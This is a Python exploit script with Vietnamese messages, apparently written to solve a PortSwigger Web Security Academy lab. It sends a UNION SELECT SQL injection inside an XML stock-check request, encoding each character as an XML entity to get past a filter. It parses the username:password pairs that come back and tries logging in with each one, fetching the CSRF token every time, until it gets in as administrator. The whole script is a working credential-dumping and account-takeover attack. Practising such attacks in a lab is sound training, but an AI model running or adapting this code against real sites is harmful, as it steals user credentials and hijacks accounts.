import requests
import re

HOST = "https://0a7b006204e66e7481cdc0f80035003c.web-security-academy.net"
STOCK_URL = f"{HOST}/product/stock"
LOGIN_URL = f"{HOST}/login"

ATTACK_SESSION_COOKIE = "0MsBYLlLK9fpAmEljBilhfmH39q6aqT9"

print("[*] Đang khai thác SQL Injection...")

payload = "1 UNION SELECT CONCAT(username,':',password) FROM users"
encoded_payload = "".join([f"&#{ord(c)};" for c in payload]) 

data_xml = f"""<?xml version="1.0" encoding="UTF-8"?>
<stockCheck>
    <productId>1</productId>
    <storeId>{encoded_payload}</storeId>
</stockCheck>
"""

headers = {
    "Cookie": f"session={ATTACK_SESSION_COOKIE}",
    "Content-Type": "application/xml",
}

res = requests.post(STOCK_URL, headers=headers, data=data_xml)

accounts = re.findall(r"(\w+):(\w+)", res.text)

print(f"[+] Tìm thấy {len(accounts)} tài khoản tiềm năng.")

def try_login(username, password):
    s = requests.Session()
 
    login_page = s.get(LOGIN_URL)
 
    csrf_match = re.search(r'name="csrf" value="(.*?)"', login_page.text)
    
    if not csrf_match:
        print("[-] Không tìm thấy CSRF token.")
        return False
        
    csrf_token = csrf_match.group(1)
    login_data = {
        "csrf": csrf_token,
        "username": username,
        "password": password
    }
    
    # Gửi request đăng nhập
    resp = s.post(LOGIN_URL, data=login_data)

    if "Log out" in resp.text or resp.status_code == 302:
        return True
    return False

found_admin = False
for user, pwd in accounts:
        
    print(f"[*] Đang thử đăng nhập: {user} / {pwd}")
    
    if try_login(user, pwd):
        print(f"SUCCESS!!! Đăng nhập thành công với user: {user}")
        if user == "administrator":
            found_admin = True
            break
    else:
        print("[-] Thất bại.")

if not found_admin:
    print("Kết thúc quá trình, không login được admin.")